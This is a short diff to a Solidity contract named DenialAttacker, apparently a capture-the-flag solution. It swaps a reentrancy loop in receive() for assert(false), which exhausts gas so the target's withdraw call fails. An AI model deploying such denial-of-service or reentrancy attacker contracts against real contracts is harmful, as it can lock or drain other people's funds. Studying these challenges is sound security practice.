@@ -13,8 +13,7 @@ contract DenialAttacker {
   }
 
   receive() external payable {
-     address(denial).call{value: msg.value}(""); // send back the funds
-     denial.withdraw(); // re-enter
+    assert(false); // consumes all gas
   }
 
 }
